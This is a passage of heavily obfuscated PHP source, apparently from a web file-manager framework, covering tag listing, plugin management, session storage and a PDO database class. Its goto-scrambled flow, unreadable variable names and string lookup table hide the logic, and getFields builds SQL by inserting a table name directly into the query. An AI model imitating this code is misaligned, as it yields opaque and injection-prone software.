D„¹ˆóòÖ: $eĞ£Å¢âà =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$bØ¾¾Î‘†‡ || !$F£±õÕœÉø) { return !1; } if (!Model($eĞ£Å¢âà[484])->getInfoSimple($bØ¾¾Î‘†‡)) { return !1; } goto e¿…îš±Ê¸; Cä„®Ë¬ùá: return is_array($CÖ£Š—’¹É) ? $CÖ£Š—’¹É : !1; goto DÄæ±òÆíÄ; DÄæ±òÆíÄ: } public function listSource($dŞè¨‰­ó, $a£Ó£éåš ) { goto d‡Ç¼ÆÑßÊ; E¢³×ˆòÏÉ: if (!$c³Öš›İÎ„ || count($DªàÀ’µÊÁ) == $c³Öš›İÎ„[$B§ù­…ßƒÚ[363]][$B§ù­…ßƒÚ[364]]) { return $c³Öš›İÎ„; } $añéÌŸ•ŸÚ = array(); $D‹©‰ô’Íà = array_to_keyvalue($c³Öš›İÎ„[$B§ù­…ßƒÚ[75]], $B§ù­…ßƒÚ[33], $B§ù­…ßƒÚ[394]); goto F°É Ü¾É; F¤Ğ˜Ç£”Â: foreach ($Eœ…†Œ³×È as $bÉä·Ó‡‘î => $f’¹ë¼†¼š) { $aÖµÖªÃ³› = !0; if (!$a£Ó£éåš ) { $DªàÀ’µÊÁ[] = $bÉä·Ó‡‘î; continue; } foreach ($a£Ó£éåš  as $eˆÍ…ô´Ö) { if (!in_array($eˆÍ…ô´Ö, $f’¹ë¼†¼š)) { $aÖµÖªÃ³› = !1; break; } } if ($aÖµÖªÃ³›) { $DªàÀ’µÊÁ[] = $bÉä·Ó‡‘î; } } if (!$DªàÀ’µÊÁ) { return array(); } $c³Öš›İÎ„ = Model($B§ù­…ßƒÚ[1187])->listSource(array($B§ù­…ßƒÚ[408] => array($B§ù­…ßƒÚ[409], $DªàÀ’µÊÁ))); goto E¢³×ˆòÏÉ; F¿”ï¬ˆ½: $Eœ…†Œ³×È = array(); foreach ($f…Ò†Ò£© as $F•­Ø‹‚Ç†) { $A¬°ô”ÓíÚ = $F•­Ø‹‚Ç†[$B§ù­…ßƒÚ[76]]; if (!$A¬°ô”ÓíÚ) { continue; } if (!isset($Eœ…†Œ³×È[$A¬°ô”ÓíÚ])) { $Eœ…†Œ³×È[$A¬°ô”ÓíÚ] = array(); } $Eœ…†Œ³×È[$A¬°ô”ÓíÚ][] = $F•­Ø‹‚Ç†[$B§ù­…ßƒÚ[417]]; } $DªàÀ’µÊÁ = array(); goto F¤Ğ˜Ç£”Â; d‡Ç¼ÆÑßÊ: $B§ù­…ßƒÚ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($a£Ó£éåš  && !is_array($a£Ó£éåš )) { $a£Ó£éåš  = array($a£Ó£éåš ); } $f…Ò†Ò£© = $this->listData($dŞè¨‰­ó); goto F¿”ï¬ˆ½; C«¥íšòÕˆ: if ($añéÌŸ•ŸÚ) { $this->removeBySource($dŞè¨‰­ó, $añéÌŸ•ŸÚ); } return $c³Öš›İÎ„; goto c¾ÙÕøºªÄ; F°É Ü¾É: $d¥”·ï ¢ = array_to_keyvalue($c³Öš›İÎ„[$B§ù­…ßƒÚ[74]], $B§ù­…ßƒÚ[33], $B§ù­…ßƒÚ[394]); $CÉËªˆ¡Á· = array_merge($d¥”·ï ¢, $D‹©‰ô’Íà); foreach ($DªàÀ’µÊÁ as $A¬°ô”ÓíÚ) { if (!in_array($A¬°ô”ÓíÚ, $CÉËªˆ¡Á·)) { $añéÌŸ•ŸÚ[] = $A¬°ô”ÓíÚ; } } goto C«¥íšòÕˆ; c¾ÙÕøºªÄ: } protected function listData($dÑ·µÅª‰) { $fÌ«•²±É¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fğ¦ÊÙƒôï = array($fÌ«•²±É¤[1500] => 0, $fÌ«•²±É¤[461] => array($fÌ«•²±É¤[1777], 0), $fÌ«•²±É¤[413] => $fÌ«•²±É¤[1778] . $dÑ·µÅª‰); $d¤–à¤„ = $fÌ«•²±É¤[1779]; $CøÆĞÔèñ = $this->field($d¤–à¤„)->where($Fğ¦ÊÙƒôï)->order($fÌ«•²±É¤[1780])->select(); return $CøÆĞÔèñ ? $CøÆĞÔèñ : array(); } protected function addToTag($e»¬©¦ÓŞ, $fôïğî«ƒĞ, $A•õÓõ’Ì) { $a¡‘‹„ƒñ± =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->getByTagID($e»¬©¦ÓŞ, $A•õÓõ’Ì) || !$fôïğî«ƒĞ) { return !1; } if (!Model($a¡‘‹„ƒñ±[782])->pathInfo($fôïğî«ƒĞ)) { return !1; } $CºÊ©°ëÈ¢ = array($a¡‘‹„ƒñ±[1500] => 0, $a¡‘‹„ƒñ±[461] => $A•õÓõ’Ì, $a¡‘‹„ƒñ±[412] => $fôïğî«ƒĞ, $a¡‘‹„ƒñ±[413] => $a¡‘‹„ƒñ±[1781] . $e»¬©¦ÓŞ, $a¡‘‹„ƒñ±[411] => $a¡‘‹„ƒñ±[33], $a¡‘‹„ƒñ±[1675] => 0); if ($this->where($CºÊ©°ëÈ¢)->find()) { return !1; } return $this->add($CºÊ©°ëÈ¢); } protected function removeFromTag($Däç–ù¥à, $BÛØÆ¶ŠËë, $eÄèŞíĞ˜) { $Eù¼´«ã¶° =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->getByTagID($Däç–ù¥à, $eÄèŞíĞ˜) || !$BÛØÆ¶ŠËë) { return !1; } if (is_array($BÛØÆ¶ŠËë)) { $BÛØÆ¶ŠËë = array($Eù¼´«ã¶°[7], $BÛØÆ¶ŠËë); } $c¤óÊàÊÛ = array($Eù¼´«ã¶°[1500] => 0, $Eù¼´«ã¶°[461] => $eÄèŞíĞ˜, $Eù¼´«ã¶°[413] => $Eù¼´«ã¶°[1781] . $Däç–ù¥à, $Eù¼´«ã¶°[412] => $BÛØÆ¶ŠËë); return $this->where($c¤óÊàÊÛ)->delete(); } protected function removeByTag($B×Ñ¿çâ­œ, $CÛ¥‘Å‰´) { $c¶ÎÛ‡ÅÆ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->getByTagID($B×Ñ¿çâ­œ, $CÛ¥‘Å‰´)) { return !1; } $DÇİ¤Ê¾‡ = array($c¶ÎÛ‡ÅÆ[1500] => 0, $c¶ÎÛ‡ÅÆ[461] => $CÛ¥‘Å‰´, $c¶ÎÛ‡ÅÆ[413] => $c¶ÎÛ‡ÅÆ[1781] . $B×Ñ¿çâ­œ); return $this->where($DÇİ¤Ê¾‡)->delete(); } protected function removeBySource($dğ”´ÇÏ–Ù, $C‡º¢ìÆˆÛ) { $bØ§—Úî³¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$dğ”´ÇÏ–Ù || !$C‡º¢ìÆˆÛ) { return !1; } if (is_array($C‡º¢ìÆˆÛ)) { $C‡º¢ìÆˆÛ = array($bØ§—Úî³¸[7], $C‡º¢ìÆˆÛ); } $f–ÏÄİ¥â¢ = array($bØ§—Úî³¸[1500] => 0, $bØ§—Úî³¸[412] => $C‡º¢ìÆˆÛ, $bØ§—Úî³¸[461] => array($bØ§—Úî³¸[955], 0), $bØ§—Úî³¸[413] => $bØ§—Úî³¸[1781] . $dğ”´ÇÏ–Ù); return $this->where($f–ÏÄİ¥â¢)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\160\x6c\x75\147\x69\x6e\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\163\x74\141\164\x75\x73", "\162\x65\147\151\x65\163\x74", "\143\157\x6e\x66\x69\x67"); public function loadList($CŒÀàšÀ© = false) { $aâññßÇ²œ = array_to_keyvalue($this->listData(), $_SERVER[Ïº«‚ßèÔˆø][28]); if ($CŒÀàšÀ©) { return $aâññßÇ²œ[$CŒÀàšÀ©]; } return $aâññßÇ²œ; } public function init() { $a¿Æ«¯ùÅí =& $_SERVER[Ïº«‚ßèÔˆø]; Hook::trigger($a¿Æ«¯ùÅí[1782]); $c»Œô—¥Ú× = $this->loadPluginList(); foreach ($c»Œô—¥Ú× as $A›áˆ ®·… => $eï˜¢Ç…®) { $c»‰¹•Ğ˜² = $this->appAllow($A›áˆ ®·…, $eï˜¢Ç…®); if (!$c»‰¹•Ğ˜²) { continue; } foreach ($eï˜¢Ç…®[$a¿Æ«¯ùÅí[1783]] as $eÃ†Ş•™éÄ => $CïòŒ«—îœ) { Hook::bind($eÃ†Ş•™éÄ, $CïòŒ«—îœ); } } Hook::trigger($a¿Æ«¯ùÅí[1784]); Hook::trigger(ACTION); } public function appAllow($a”×¬éÏ´¹, $cÎ­ÂÓ‹…Ô, $C˜œ×Œ»èĞ = true) { $fô´³®˜”à =& $_SERVER[Ïº«‚ßèÔˆø]; $AÚ‡î´á× = PLUGIN_DIR . $a”×¬éÏ´¹ . $fô´³®˜”à[1785]; if (!is_array($cÎ­ÂÓ‹…Ô) || !is_array($cÎ­ÂÓ‹…Ô[$fô´³®˜”à[1783]]) || $cÎ­ÂÓ‹…Ô[$fô´³®˜”à[697]] != 1 || !is_file($AÚ‡î´á×)) { return !1; } if ($GLOBALS[$fô´³®˜”à[483]] == 1) { return !0; } if ($C˜œ×Œ»èĞ && !Action($fô´³®˜”à[1786])->checkAuth($a”×¬éÏ´¹)) { return !1; } return !0; } public function unInstall($E„­‡²Ä­¥) { $A‘›¸Ç’“ =& $_SERVER[Ïº«‚ßèÔˆø]; $cÔ¹à¶Î•ò = $this->loadList($E„­‡²Ä­¥); if (file_exists(PLUGIN_DIR . $E„­‡²Ä­¥)) { Hook::apply($E„­‡²Ä­¥ . $A‘›¸Ç’“[1787]); } $this->remove($cÔ¹à¶Î•ò[$A‘›¸Ç’“[392]]); } public function changeStatus($cŸºˆ„á, $böèì£Õ¡) { $C÷òğğĞ¶Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $E²±ñÎ¦·Ê = $this->loadList($cŸºˆ„á); if ($böèì£Õ¡) { Hook::apply($cŸºˆ„á . $C÷òğğĞ¶Ç[1788]); } $this->update($E²±ñÎ¦·Ê[$C÷òğğĞ¶Ç[392]], array($C÷òğğĞ¶Ç[1789] => $böèì£Õ¡)); } public function appRegist($aÆ˜«—¼…³, $cÔ¿º¡å˜) { $FËÃ±á†‚ä =& $_SERVER[Ïº«‚ßèÔˆø]; $cµÈ¤ÀÇø = $this->loadList($aÆ˜«—¼…³); if ($cµÈ¤ÀÇø) { $this->update($cµÈ¤ÀÇø[$FËÃ±á†‚ä[392]], array($FËÃ±á†‚ä[1783] => $cÔ¿º¡å˜)); } else { $e’µ¦Åè»… = array($FËÃ±á†‚ä[28] => $aÆ˜«—¼…³, $FËÃ±á†‚ä[1783] => $cÔ¿º¡å˜, $FËÃ±á†‚ä[697] => 0, $FËÃ±á†‚ä[6] => $this->getConfigDefault($aÆ˜«—¼…³)); $this->insert($e’µ¦Åè»…); } } public function getConfigDefault($d…Ü‹°ºô÷) { $AâôÛ±ªŒù =& $_SERVER[Ïº«‚ßèÔˆø]; $aÁ˜Íªºï§ = array(); $c¬š‚³Ò‰ç = $this->getPackageJson($d…Ü‹°ºô÷); if (!$c¬š‚³Ò‰ç && is_array($c¬š‚³Ò‰ç[$AâôÛ±ªŒù[1790]])) { return $aÁ˜Íªºï§; } foreach ($c¬š‚³Ò‰ç[$AâôÛ±ªŒù[1790]] as $DÚ™”ÍÂ” => $E’÷’²îºì) { if (!isset($E’÷’²îºì[$AâôÛ±ªŒù[371]]) || isset($aÁ˜Íªºï§[$DÚ™”ÍÂ”])) { continue; } $aÁ˜Íªºï§[$DÚ™”ÍÂ”] = $E’÷’²îºì[$AâôÛ±ªŒù[371]]; } return $aÁ˜Íªºï§; } public function getPackageJson($dÜİ°İÙå) { return Hook::apply($dÜİ°İÙå . $_SERVER[Ïº«‚ßèÔˆø][1791]); } public function getConfig($e¦˜¤¯ÊÇ¾, $b¢‹ÄŒË®¡ = false) { $Dè²èøÍÍ =& $_SERVER[Ïº«‚ßèÔˆø]; $FÁ¶íÁ„½Ü = array(); $Eé• •‚»Ş = $this->loadList($e¦˜¤¯ÊÇ¾); if ($Eé• •‚»Ş && is_array($Eé• •‚»Ş[$Dè²èøÍÍ[6]])) { $FÁ¶íÁ„½Ü = $Eé• •‚»Ş[$Dè²èøÍÍ[6]]; } if (!$FÁ¶íÁ„½Ü || $b¢‹ÄŒË®¡) { $FÁ¶íÁ„½Ü = $this->getConfigDefault($e¦˜¤¯ÊÇ¾); } return $FÁ¶íÁ„½Ü; } public function setConfig($FøØ¹óŒù, $f³Ñ¿·³ = false) { goto Fˆå½›“öí; Fˆå½›“öí: $E‚›±¾—œà =& $_SERVER[Ïº«‚ßèÔˆø]; $Däà‚’Ÿ = $this->loadList($FøØ¹óŒù); if (!$Däà‚’Ÿ) { return !1; } goto cº½İ±Ş’ç; Dó„äÕ‚µ: $this->update($Däà‚’Ÿ[$E‚›±¾—œà[392]], array($E‚›±¾—œà[6] => $c–á’èÓ™)); goto B–†¹Ôõ; cº½İ±Ş’ç: $c–á’èÓ™ = $Däà‚’Ÿ[$E‚›±¾—œà[6]]; if ($f³Ñ¿·³ == !1) { $c–á’èÓ™ = array(); $f³Ñ¿·³ = $this->getConfigDefault($FøØ¹óŒù); } foreach ($f³Ñ¿·³ as $bäï¤ÑÃÇš => $bóœ£ÂŒ¶) { $c–á’èÓ™[$bäï¤ÑÃÇš] = is_string($bóœ£ÂŒ¶) ? trim($bóœ£ÂŒ¶) : $bóœ£ÂŒ¶; } goto Dó„äÕ‚µ; B–†¹Ôõ: } public function viewList() { goto cóÙå§Ë‰; cóÙå§Ë‰: $B—ùÄÚŒÉá =& $_SERVER[Ïº«‚ßèÔˆø]; $fÑ¦Ê–øˆ‡ = $this->loadList(); $this->pluginScan($fÑ¦Ê–øˆ‡); goto fàôÒĞ²ôº; fàôÒĞ²ôº: $fÑ¦Ê–øˆ‡ = $this->loadPluginList(); $bÕí‹ÒÇìˆ = array(); foreach ($fÑ¦Ê–øˆ‡ as $b‡ÑÙ²ÄÑÉ => $a ·˜¦ ½ó) { unset($a ·˜¦ ½ó[$B—ùÄÚŒÉá[1783]], $a ·˜¦ ½ó[$B—ùÄÚŒÉá[6]]); $CâÑ°®¥‚ = PLUGIN_DIR . $a ·˜¦ ½ó[$B—ùÄÚŒÉá[28]] . $B—ùÄÚŒÉá[1785]; if (!is_file($CâÑ°®¥‚)) { continue; } $fö†Šøåš = Hook::apply($a ·˜¦ ½ó[$B—ùÄÚŒÉá[28]] . $B—ùÄÚŒÉá[1791]); if (is_array($fö†Šøåš)) { $bÕí‹ÒÇìˆ[$b‡ÑÙ²ÄÑÉ] = array_merge($a ·˜¦ ½ó, $fö†Šøåš); } } goto fÓÓšÁØèï; fÓÓšÁØèï: return $bÕí‹ÒÇìˆ; goto D¥ø…’„³; D¥ø…’„³: } private function loadPluginList() { $aäÈ‚™ê¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $fé„Áã¼ØÉ = $this->loadList(); if (strtolower(MOD) == $aäÈ‚™ê¬[1792]) { return $fé„Áã¼ØÉ; } $A‘Á§äù­ = Hook::trigger($aäÈ‚™ê¬[1793], $fé„Áã¼ØÉ); if ($fé„Áã¼ØÉ && !$A‘Á§äù­) { die; } return $A‘Á§äù­ ? $A‘Á§äù­ : $fé„Áã¼ØÉ; } private function pluginScan($cÏëùÈå‘) { $føÍ›Èæó =& $_SERVER[Ïº«‚ßèÔˆø]; recursion_dir(PLUGIN_DIR, $aÚÃ ˜¡—, $D‡½Ç™‚‡, 0); foreach ($aÚÃ ˜¡— as $dš»À¯ÙÄ‰) { $e­«—é‰­› = get_path_this($dš»À¯ÙÄ‰); if (isset($cÏëùÈå‘[$e­«—é‰­›]) || !file_exists($dš»À¯ÙÄ‰ . $føÍ›Èæó[1794]) || !file_exists($dš»À¯ÙÄ‰ . $føÍ›Èæó[1785])) { continue; } Hook::apply($e­«—é‰­› . $føÍ›Èæó[1788]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x73\145\x73\163\151\x6f\x6e"; public function get($a Š‡Õ‡ğ) { $C‡´ª¯¾˜î =& $_SERVER[Ïº«‚ßèÔˆø]; $b´áÅÛ»Ğ“ = $this->where(array($C‡´ª¯¾˜î[1795] => $a Š‡Õ‡ğ))->find(); if (!is_array($b´áÅÛ»Ğ“)) { return !1; } return $b´áÅÛ»Ğ“[$C‡´ª¯¾˜î[700]]; } public function set($fëö˜ˆ¤˜ƒ, $Aç»ë«•¤, $dÁ¹¥‚Ê¥ï = 3600) { $C·ˆ‰ë¨‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $F½­¿İÁ×ø = array($C·ˆ‰ë¨‚[1795] => $fëö˜ˆ¤˜ƒ, $C·ˆ‰ë¨‚[1704] => $Aç»ë«•¤, $C·ˆ‰ë¨‚[1796] => $dÁ¹¥‚Ê¥ï + time()); if (Session::get($C·ˆ‰ë¨‚[1797])) { $F½­¿İÁ×ø[$C·ˆ‰ë¨‚[1508]] = Session::get($C·ˆ‰ë¨‚[1797]); } else { $F½­¿İÁ×ø[$C·ˆ‰ë¨‚[1508]] = 0; } if ($this->get($fëö˜ˆ¤˜ƒ)) { return $this->where(array($C·ˆ‰ë¨‚[1795] => $fëö˜ˆ¤˜ƒ))->save($F½­¿İÁ×ø); } else { return $this->add($F½­¿İÁ×ø, array(), !0); } } public function remove($Aàµğâñæ•) { return $this->where(array($_SERVER[Ïº«‚ßèÔˆø][1795] => $Aàµğâñæ•))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ïº«‚ßèÔˆø][1798] . time())->delete(); } } goto AŠôéÚŠé´; AßßÆšê¤µ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($E„Áğâ„º = '') { $E‚ËÇ™ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!class_exists($E‚ËÇ™ˆ[857])) { think_exception(think_lang($E‚ËÇ™ˆ[10]) . $E‚ËÇ™ˆ[858]); } if (!empty($E„Áğâ„º)) { $this->config = $E„Áğâ„º; if (empty($this->config[$E‚ËÇ™ˆ[13]])) { $this->config[$E‚ËÇ™ˆ[13]] = array(); } } } public function connect($C‘ğéÈ¨—É = '', $dùæŸÊ÷è‰ = 0) { $dáÌÊèØªô =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->linkID[$dùæŸÊ÷è‰])) { goto a³´Â†Ÿ·™; EÔíâ­ÙÊƒ: try { $this->linkID[$dùæŸÊ÷è‰] = new PDO($C‘ğéÈ¨—É[$dáÌÊèØªô[859]], $C‘ğéÈ¨—É[$dáÌÊèØªô[832]], $C‘ğéÈ¨—É[$dáÌÊèØªô[833]], $C‘ğéÈ¨—É[$dáÌÊèØªô[13]]); } catch (PDOException $F†‰•ØŞøñ) { think_exception($F†‰•ØŞøñ->getMessage()); } $this->dbType = $this->_getDsnType($C‘ğéÈ¨—É[$dáÌÊèØªô[859]]); if (in_array($this->dbType, array($dáÌÊèØªô[860], $dáÌÊèØªô[861], $dáÌÊèØªô[862], $dáÌÊèØªô[863]))) { think_exception($dáÌÊèØªô[864] . $this->dbType . $dáÌÊèØªô[865] . $this->dbType . $dáÌÊèØªô[866]); } goto Fõ…¯°˜‘ï; a³´Â†Ÿ·™: if (empty($C‘ğéÈ¨—É)) { $C‘ğéÈ¨—É = $this->config; } $e•¦ïŞÜòç = !empty($C‘ğéÈ¨—É[$dáÌÊèØªô[13]][$dáÌÊèØªô[14]]) ? $C‘ğéÈ¨—É[$dáÌÊèØªô[13]][$dáÌÊèØªô[14]] : $this->pconnect; if ($e•¦ïŞÜòç) { $C‘ğéÈ¨—É[$dáÌÊèØªô[13]][PDO::ATTR_PERSISTENT] = !0; } goto EÔíâ­ÙÊƒ; Fõ…¯°˜‘ï: if (!$this->linkID[$dùæŸÊ÷è‰]) { think_exception($dáÌÊèØªô[867]); } try { $this->linkID[$dùæŸÊ÷è‰]->exec($dáÌÊèØªô[868] . think_config($dáÌÊèØªô[835])); } catch (Exception $F†‰•ØŞøñ) { } $this->connected = !0; goto E´× ä¼¡; E´× ä¼¡: if (1 != think_config($dáÌÊèØªô[18])) { unset($this->config); } goto F³÷‘Å¯†‡; F³÷‘Å¯†‡: } return $this->linkID[$dùæŸÊ÷è‰]; } public function free() { $this->PDOStatement = null; } public function query($Cè×®£ßÌ, $FùÓöçíİì = array()) { goto aÊÏÚÆêª“; F†ëöŠ½®: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÎà›ÍÎ¬ = $this->PDOStatement->execute($FùÓöçíİì); $this->debug(); goto AÖ ¾ó‰; BÚ†Ñëİ¾Œ: $this->queryStr = $Cè×®£ßÌ; if (!empty($FùÓöçíİì)) { $this->queryStr .= $Aî¶éèƒâ¼[869] . print_r($FùÓöçíİì, !0) . $Aî¶éèƒâ¼[870]; } if (!empty($this->PDOStatement)) { $this->free(); } goto F±Ä•Ñê®; AÖ ¾ó‰: if (!1 === $bÎà›ÍÎ¬) { $this->error(); return !1; } else { return $this->getAll(); } goto C…Ò¦Ñˆ„•; aÊÏÚÆêª“: $Aî¶éèƒâ¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÚ†Ñëİ¾Œ; F±Ä•Ñê®: think_action_status($Aî¶éèƒâ¼[19], 1); think_status($Aî¶éèƒâ¼[20]); $this->PDOStatement = $this->_linkID->prepare($Cè×®£ßÌ); goto F†ëöŠ½®; C…Ò¦Ñˆ„•: } public function execute($dŞÎä±ˆ•º, $DäšƒìòãÖ = array()) { goto Cİñ·‘ªÖ¤; Cİñ·‘ªÖ¤: $eê¸‚Şâ˜è =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aš¡ó¾å÷²; D¯‰¥ƒ©á: if ($this->dbType == $eê¸‚Şâ˜è[863]) { if (preg_match($eê¸‚Şâ˜è[871], $this->queryStr, $féë˜¼Î¥†)) { $this->table = think_config($eê¸‚Şâ˜è[872]) . str_ireplace(think_config($eê¸‚Şâ˜è[873]), $eê¸‚Şâ˜è[374], $féë˜¼Î¥†[2]); $a‡İô¡š  = (bool) $this->query($eê¸‚Şâ˜è[874] . strtoupper($this->table) . $eê¸‚Şâ˜è[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eê¸‚Şâ˜è[21], 1); goto cš‡ºÏ”‚Á; cš‡ºÏ”‚Á: think_status($eê¸‚Şâ˜è[20]); $this->PDOStatement = $this->_linkID->prepare($dŞÎä±ˆ•º); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto BÇÈÑ¦¾ö´; aš¡ó¾å÷²: $this->queryStr = $dŞÎä±ˆ•º; if (!empty($DäšƒìòãÖ)) { $this->queryStr .= $eê¸‚Şâ˜è[869] . print_r($DäšƒìòãÖ, !0) . $eê¸‚Şâ˜è[870]; } $a‡İô¡š  = !1; goto D¯‰¥ƒ©á; BÇÈÑ¦¾ö´: $aÔä¹÷Ë¹ = $this->PDOStatement->execute($DäšƒìòãÖ); $this->debug(); if (!1 === $aÔä¹÷Ë¹) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($a‡İô¡š  || preg_match($eê¸‚Şâ˜è[875], $dŞÎä±ˆ•º)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto fÍ±¤ñˆéÈ; fÍ±¤ñˆéÈ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÇ‹†‡î = $this->_linkID->commit(); $this->transTimes = 0; if (!$CÇ‹†‡î) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dƒˆ™Á® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dƒˆ™Á®) { $this->error(); return !1; } } return !0; } private function getAll() { $CÀ„„¸›ƒ’ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($CÀ„„¸›ƒ’); return $CÀ„„¸›ƒ’; } public function getFields($b›ÅØ™‚±ù) { goto bç¼›‰ö„Ş; EËŠíãáàÊ: $cÛƒ”¢ˆÌõ = $this->query($eÙï£­ô‰¯); $A¢›™ß‰Ã‡ = array(); if ($cÛƒ”¢ˆÌõ) { foreach ($cÛƒ”¢ˆÌõ as $C‡Ş­õ¼ => $fŠ‰ƒ»àçÂ) { $fŠ‰ƒ»àçÂ = array_change_key_case($fŠ‰ƒ»àçÂ); $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[28]] = isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[28]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[28]] : $aèÔ‡ˆê¶[374]; $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[29]] = isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[29]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[29]] : $aèÔ‡ˆê¶[374]; $FÓ‡ò»¼ = isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[270]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[270]] : $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[28]]; $A¢›™ß‰Ã‡[$FÓ‡ò»¼] = array($aèÔ‡ˆê¶[28] => $FÓ‡ò»¼, $aèÔ‡ˆê¶[29] => $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[29]], $aèÔ‡ˆê¶[31] => (bool) (isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[103]]) && $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[103]] === $aèÔ‡ˆê¶[33] || isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[31]]) && $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[31]] === $aèÔ‡ˆê¶[33]), $aèÔ‡ˆê¶[34] => isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[34]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[34]] : (isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[53]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[53]] : $aèÔ‡ˆê¶[374]), $aèÔ‡ˆê¶[36] => isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[93]]) ? strtolower($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[93]]) == $aèÔ‡ˆê¶[38] : (isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[54]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[54]] : !1), $aèÔ‡ˆê¶[39] => isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[892]]) ? strtolower($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[892]]) == $aèÔ‡ˆê¶[41] : (isset($fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[93]]) ? $fŠ‰ƒ»àçÂ[$aèÔ‡ˆê¶[93]] : !1)); } } goto bÌ„µ÷¿Ç; bç¼›‰ö„Ş: $aèÔ‡ˆê¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (think_config($aèÔ‡ˆê¶[876])) { $eÙï£­ô‰¯ = str_replace($aèÔ‡ˆê¶[877], $b›ÅØ™‚±ù, think_config($aèÔ‡ˆê¶[876])); } else { switch ($this->dbType) { case $aèÔ‡ˆê¶[860]: case $aèÔ‡ˆê¶[878]: $eÙï£­ô‰¯ = "\x53\105\114\105\x43\x54\40\40\40\143\157\x6c\165\155\x6e\x5f\x6e\x61\x6d\145\40\141\x73\40\47\x4e\x61\x6d\145\x27\x2c\x20\x20\40\144\x61\x74\x61\x5f\164\x79\160\145\x20\x61\163\x20\47\x54\171\x70\145\47\x2c\x20\40\40\143\157\x6c\x75\155\x6e\x5f\144\x65\146\141\x75\x6c\164\x20\141\163\40\47\x44\145\146\141\x75\x6c\164\47\54\x20\x20\x20\151\x73\x5f\156\165\154\x6c\141\x62\154\x65\x20\141\163\40\47\x4e\165\154\154\x27\12\11\11\106\122\x4f\115\x9\151\156\x66\157\162\x6d\141\164\x69\x6f\x6e\137\163\143\x68\145\x6d\x61\x2e\164\141\142\154\145\x73\x20\101\x53\40\164\12\x9\x9\x4a\x4f\111\x4e\11\151\x6e\146\157\x72\155\141\164\151\x6f\156\x5f\163\143\150\x65\155\141\x2e\x63\157\x6c\x75\x6d\x6e\163\x20\101\123\x20\x63\12\x9\x9\117\116\x20\x20\x74\56\x74\x61\x62\x6c\x65\x5f\143\x61\164\x61\154\x6f\x67\x20\x3d\40\x63\56\164\141\x62\154\x65\137\x63\x61\x74\x61\x6c\x6f\x67\12\11\11\101\116\104\x20\164\x2e\164\x61\x62\x6c\145\x5f\163\143\150\x65\155\141\x20\75\x20\x63\56\x74\141\142\154\145\137\x73\x63\150\145\155\x61\xa\11\11\x41\x4e\x44\40\164\x2e\164\141\142\x6c\x65\x5f\156\x61\155\145\40\x3d\40\x63\x2e\x74\141\x62\154\145\x5f\156\141\x6d\145\12\11\x9\127\110\x45\122\105\x20\40\40\164\x2e\x74\141\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x20\x3d\40\x27{$b›ÅØ™‚±ù}\x27"; break; case $aèÔ‡ˆê¶[879]: $eÙï£­ô‰¯ = $aèÔ‡ˆê¶[880] . $b›ÅØ™‚±ù . $aèÔ‡ˆê¶[881]; break; case $aèÔ‡ˆê¶[861]: case $aèÔ‡ˆê¶[863]: $eÙï£­ô‰¯ = 